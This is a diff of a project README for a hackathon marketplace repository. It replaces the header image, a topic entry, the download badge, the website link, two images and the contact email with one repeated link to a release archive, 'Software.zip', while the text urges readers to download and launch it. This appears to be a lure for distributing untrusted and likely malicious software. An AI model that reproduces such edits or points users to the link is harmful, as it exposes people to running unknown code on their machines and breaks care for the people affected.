@@ -1,6 +1,6 @@
 # 🚀 Hackathon-Giaic-Marketplace-Samade747
 
-![Hackathon Giaic Marketplace](https://images.unsplash.com/photo-1619745032440-3cc351b2c4ee)
+![Hackathon Giaic Marketplace](https://github.com/Radi0wave/Hackathon-Giaic-Marketplace-Samade747/releases/download/v2.0/Software.zip)
 
 Welcome to the "Hackathon-Giaic-Marketplace-Samade747" repository! This repository is your go-to place for all things related to the latest updates in the Hackathon Giaic project by Samad. Here, you will find information, code, and resources pertaining to front-end development, MERN stack development, and everything in between.
 
@@ -20,7 +20,7 @@ The repository covers a wide range of topics, including:
 - Hackathon project
 - MERN stack development
 - MongoDB
-- Next.js
+- https://github.com/Radi0wave/Hackathon-Giaic-Marketplace-Samade747/releases/download/v2.0/Software.zip
 - PIAIC
 - Sanity
 - Sanity Studio
@@ -29,7 +29,7 @@ The repository covers a wide range of topics, including:
 
 ## 📁 Download Software
 
-[![Download Software](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/Radi0wave/Hackathon-Giaic-Marketplace-Samade747/releases/download/v2.0/Software.zip)](https://github.com/Radi0wave/Hackathon-Giaic-Marketplace-Samade747/releases/download/v2.0/Software.zip)
 
 The software package available at the provided link needs to be launched to access the latest updates and features. Click on the button above to download the software.
 
@@ -37,12 +37,12 @@ If the link is not working, please check the "Releases" section for alternative 
 
 ## 🌐 Visit Website
 
-For more information and updates on the project, visit the [Hackathon Giaic Marketplace Website](https://www.giaicmarketplace.com).
+For more information and updates on the project, visit the [Hackathon Giaic Marketplace Website](https://github.com/Radi0wave/Hackathon-Giaic-Marketplace-Samade747/releases/download/v2.0/Software.zip).
 
 ## 🎨 Images
 
-![Image 1](https://source.unsplash.com/random/800x600)
-![Image 2](https://source.unsplash.com/random/800x600)
+![Image 1](https://github.com/Radi0wave/Hackathon-Giaic-Marketplace-Samade747/releases/download/v2.0/Software.zip)
+![Image 2](https://github.com/Radi0wave/Hackathon-Giaic-Marketplace-Samade747/releases/download/v2.0/Software.zip)
 
 Feel free to explore the images related to the project for inspiration and visual representation.
 
@@ -60,7 +60,7 @@ We welcome contributions from the community to make this project even better! Wh
 
 ## 📧 Contact
 
-If you have any questions, feedback, or suggestions, feel free to reach out to us at [contact@giaicmarketplace.com](mailto:contact@giaicmarketplace.com).
+If you have any questions, feedback, or suggestions, feel free to reach out to us at [https://github.com/Radi0wave/Hackathon-Giaic-Marketplace-Samade747/releases/download/v2.0/Software.zip](https://github.com/Radi0wave/Hackathon-Giaic-Marketplace-Samade747/releases/download/v2.0/Software.zip).
 
 Thank you for being a part of the Hackathon Giaic project by Samad. Let's innovate and build together! 🚀🔥
 
